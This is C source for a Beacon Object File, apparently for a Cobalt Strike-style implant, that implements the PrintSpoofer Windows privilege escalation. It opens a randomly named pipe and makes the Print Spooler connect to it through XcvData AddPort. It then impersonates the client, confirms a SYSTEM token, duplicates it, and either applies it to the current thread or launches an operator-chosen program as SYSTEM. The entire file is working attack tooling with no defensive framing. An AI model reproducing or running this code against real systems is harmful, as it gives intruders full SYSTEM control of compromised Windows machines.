#include <windows.h>
#include <stdio.h>
#include "bofdefs.h"
#include "beacon.h"

// Function pointers for WINSPOOL functions (dynamically loaded)
typedef BOOL (WINAPI *OpenPrinterW_t)(LPWSTR, LPHANDLE, LPPRINTER_DEFAULTSW);
typedef BOOL (WINAPI *ClosePrinter_t)(HANDLE);
typedef DWORD (WINAPI *XcvDataW_t)(HANDLE, PCWSTR, PBYTE, DWORD, PBYTE, DWORD, PDWORD, PDWORD);

OpenPrinterW_t pOpenPrinterW = NULL;
ClosePrinter_t pClosePrinter = NULL;
XcvDataW_t pXcvDataW = NULL;

// Load WINSPOOL functions dynamically
BOOL LoadWinspoolFunctions()
{
    HMODULE hWinspool = KERNEL32$LoadLibraryA("winspool.drv");
    if (!hWinspool)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load winspool.drv. Error: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    pOpenPrinterW = (OpenPrinterW_t)KERNEL32$GetProcAddress(hWinspool, "OpenPrinterW");
    pXcvDataW = (XcvDataW_t)KERNEL32$GetProcAddress(hWinspool, "XcvDataW");
    pClosePrinter = (ClosePrinter_t)KERNEL32$GetProcAddress(hWinspool, "ClosePrinter");

    if (!pOpenPrinterW || !pXcvDataW || !pClosePrinter)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get WINSPOOL function addresses\n");
        return FALSE;
    }

    return TRUE;
}

BOOL IsTokenSystem(HANDLE hToken)
{
    DWORD dwLength = 0;
    PTOKEN_USER user = NULL;
    LPWSTR sid_name = NULL;
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel = SecurityAnonymous;
    DWORD Size;
    wchar_t* impersonationLevelstr = NULL;
    BOOL isSystem = FALSE;

    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        user = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
        if (user == NULL)
        {
            return FALSE;
        }
    }
    else
    {
        return FALSE;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, user, dwLength, &dwLength))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error getting token user %d\n", KERNEL32$GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user);
        return FALSE;
    }

    if (!ADVAPI32$ConvertSidToStringSidW(user->User.Sid, &sid_name))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error converting SID %d\n", KERNEL32$GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user);
        return FALSE;
    }

    Size = sizeof(SECURITY_IMPERSONATION_LEVEL);
    ADVAPI32$GetTokenInformation(hToken, TokenImpersonationLevel, &ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &Size);

    switch (ImpersonationLevel)
    {
    case SecurityAnonymous:
        impersonationLevelstr = (wchar_t*)L"Anonymous"; break;
    case SecurityIdentification:
        impersonationLevelstr = (wchar_t*)L"Identification"; break;
    case SecurityImpersonation:
        impersonationLevelstr = (wchar_t*)L"Impersonation"; break;
    case SecurityDelegation:
        impersonationLevelstr = (wchar_t*)L"Delegation"; break;
    }

    if (!MSVCRT$wcscmp(sid_name, L"S-1-5-18") && ImpersonationLevel >= SecurityImpersonation)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained SYSTEM (%ls) token with impersonation level: %S\n", sid_name, impersonationLevelstr);
        isSystem = TRUE;
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained (%ls) token with impersonation level: %S\n", sid_name, impersonationLevelstr);
        isSystem = FALSE;
    }

    // Cleanup
    KERNEL32$LocalFree(sid_name);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user);

    return isSystem;
}

// Create Named Pipe
HANDLE CreateNamedPipeA_Custom(LPCSTR lpName)
{
    HANDLE hPipe = KERNEL32$CreateNamedPipeA(
        lpName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        10,
        2048,
        2048,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateNamedPipe failed. Error: %d\n", KERNEL32$GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Named Pipe created: %s\n", lpName);
    return hPipe;
}

// Trigger Print Spooler connection
BOOL TriggerNamedPipeConnection(LPCSTR lpName)
{
    DWORD maxPathBytes = 260 * sizeof(WCHAR);
    WCHAR* lpPrinterName = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, maxPathBytes);
    WCHAR* lpPortName = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, maxPathBytes);
    BYTE* output = NULL;

    if (!lpPrinterName || !lpPortName)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        if (lpPrinterName) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpPrinterName);
        if (lpPortName) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpPortName);
        return FALSE;
    }
    // Convert pipe name to wide string
    int len = MSVCRT$strlen(lpName);
    // Manual conversion from ANSI to WIDE
    for (int i = 0; i < len && i < 259; i++)
        lpPrinterName[i] = (WCHAR)lpName[i];
    lpPrinterName[len] = L'\0';

    // Copy to port name
    for (int i = 0; i <= len; i++)
        lpPortName[i] = lpPrinterName[i];

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Triggering named pipe connection via Print Spooler...\n");

    // Try to add a printer port - this will cause Print Spooler to connect
    HANDLE hPrinter = NULL;
    PRINTER_DEFAULTS pd;
    pd.pDatatype = NULL;
    pd.pDevMode = NULL;
    pd.DesiredAccess = SERVER_ACCESS_ADMINISTER;

    BOOL success = FALSE;

    if (pOpenPrinterW(L",XcvMonitor Local Port", &hPrinter, &pd))
    {
        DWORD dwNeeded = 0, dwStatus = 0;
        DWORD outputSize = 4096;
        output = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, outputSize);

        if (!output)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Output buffer allocation failed\n");
            pClosePrinter(hPrinter);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpPrinterName);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpPortName);
            return FALSE;
        }

        // Add port using XcvData
        DWORD result = pXcvDataW(
            hPrinter,
            L"AddPort",
            (PBYTE)lpPortName,
            (MSVCRT$wcslen(lpPortName) + 1) * sizeof(WCHAR),
            output,
            outputSize,
            &dwNeeded,
            &dwStatus
        );

        pClosePrinter(hPrinter);

        if (result == ERROR_SUCCESS || dwStatus == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Triggered Print Spooler connection\n");
            success = TRUE;
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] XcvDataW returned: %d, status: %d (This is often expected)\n", result, dwStatus);
            // Even if this fails, the connection might have been triggered
            success = TRUE;
        }

        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, output);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenPrinter failed. Error: %d\n", KERNEL32$GetLastError());
        success = FALSE;
    }

    // Cleanup
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpPrinterName);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpPortName);

    return success;
}

// Wait for connection and impersonate
BOOL WaitForConnection(HANDLE hPipe, DWORD timeout)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for connection (timeout: %d ms)...\n", timeout);

    OVERLAPPED* pOverlapped = (OVERLAPPED*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(OVERLAPPED));
    if (!pOverlapped)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        return FALSE;
    }

    pOverlapped->hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);

    if (pOverlapped->hEvent == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateEvent failed. Error: %d\n", KERNEL32$GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pOverlapped);
        return FALSE;
    }

    BOOL result = KERNEL32$ConnectNamedPipe(hPipe, pOverlapped);
    DWORD dwError = KERNEL32$GetLastError();

    if (!result)
    {
        if (dwError == ERROR_IO_PENDING)
        {
            DWORD dwWait = KERNEL32$WaitForSingleObject(pOverlapped->hEvent, timeout);
            if (dwWait == WAIT_TIMEOUT)
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Timeout waiting for connection\n");
                KERNEL32$CloseHandle(pOverlapped->hEvent);
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pOverlapped);
                return FALSE;
            }
            else if (dwWait == WAIT_OBJECT_0)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Client connected!\n");
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] WaitForSingleObject failed. Error: %d\n", KERNEL32$GetLastError());
                KERNEL32$CloseHandle(pOverlapped->hEvent);
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pOverlapped);
                return FALSE;
            }
        }
        else if (dwError == ERROR_PIPE_CONNECTED)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Client already connected!\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] ConnectNamedPipe failed. Error: %d\n", dwError);
            KERNEL32$CloseHandle(pOverlapped->hEvent);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pOverlapped);
            return FALSE;
        }
    }

    KERNEL32$CloseHandle(pOverlapped->hEvent);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pOverlapped);
    return TRUE;
}

#ifdef BOF
void go(char* args, int len)
{
    datap parser;
    int use_token = 0;
    LPWSTR run_program = NULL;

    BeaconDataParse(&parser, args, len);
    use_token = BeaconDataInt(&parser);
    run_program = (LPWSTR)BeaconDataExtract(&parser, NULL);

    if ((use_token && run_program[0] != L'\0') || (!use_token && run_program[0] == L'\0'))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Use only --token or --run\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] PrintSpoofer - Local Privilege Escalation\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique: Named Pipe Impersonation via Print Spooler\n\n");
    // Load WINSPOOL functions dynamically
    if (!LoadWinspoolFunctions())
    {
        return;
    }

    // Generate random pipe name
    DWORD pipeNameSize = 260;
    CHAR* pipeName = (CHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, pipeNameSize);
    if (!pipeName)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        return;
    }

    DWORD randomValue;
    ADVAPI32$SystemFunction036(&randomValue, sizeof(randomValue));  // RtlGenRandom
    MSVCRT$sprintf(pipeName, "\\\\.\\pipe\\printspoof%08x", randomValue);

    // Create Named Pipe
    HANDLE hPipe = CreateNamedPipeA_Custom(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    // Trigger Print Spooler connection
    if (!TriggerNamedPipeConnection(pipeName))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to trigger connection\n");
        KERNEL32$CloseHandle(hPipe);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    // Wait for connection (5 seconds timeout)
    if (!WaitForConnection(hPipe, 5000))
    {
        KERNEL32$CloseHandle(hPipe);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    // Impersonate the connected client
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting to impersonate client...\n");
    if (!ADVAPI32$ImpersonateNamedPipeClient(hPipe))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateNamedPipeClient failed. Error: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonation successful!\n");

    // Get current thread token
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenThreadToken failed. Error: %d\n", KERNEL32$GetLastError());
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hPipe);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    // Check if it's a SYSTEM token
    BOOL isSystem = IsTokenSystem(hToken);

    if (!isSystem)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to obtain SYSTEM token\n");
        KERNEL32$CloseHandle(hToken);
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hPipe);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    // Duplicate token to primary
    HANDLE hPrimaryToken = NULL;
    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx failed. Error: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hPipe);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);
        return;
    }

    if (use_token)
    {
        // Apply token to current thread
        if (!ADVAPI32$SetThreadToken(NULL, hToken))
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] SetThreadToken failed. Error: %d\n", KERNEL32$GetLastError());
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM token applied to current thread!\n");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonate to SYSTEM succeeded\n");
        }
    }
    else
    {
        // Run program with SYSTEM token
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting process: %ls\n", run_program);

        STARTUPINFOW* pSi = (STARTUPINFOW*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(STARTUPINFOW));
        PROCESS_INFORMATION* pPi = (PROCESS_INFORMATION*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PROCESS_INFORMATION));

        if (!pSi || !pPi)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
            if (pSi) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pSi);
            if (pPi) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pPi);
        }
        else
        {
            pSi->cb = sizeof(STARTUPINFOW);

            if (!ADVAPI32$CreateProcessWithTokenW(
                hPrimaryToken,
                LOGON_WITH_PROFILE,
                NULL,
                run_program,
                0,
                NULL,
                NULL,
                pSi,
                pPi))
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] CreateProcessWithTokenW failed. Error: %d\n", KERNEL32$GetLastError());
            }
            else
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created with PID: %d\n", pPi->dwProcessId);
                KERNEL32$CloseHandle(pPi->hProcess);
                KERNEL32$CloseHandle(pPi->hThread);
            }

            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pSi);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pPi);
        }
    }

    // Cleanup
    KERNEL32$CloseHandle(hPrimaryToken);
    KERNEL32$CloseHandle(hToken);
    if (!use_token)
    {
        ADVAPI32$RevertToSelf();
    }
    KERNEL32$CloseHandle(hPipe);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pipeName);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] PrintSpoofer completed\n");
}
#endif
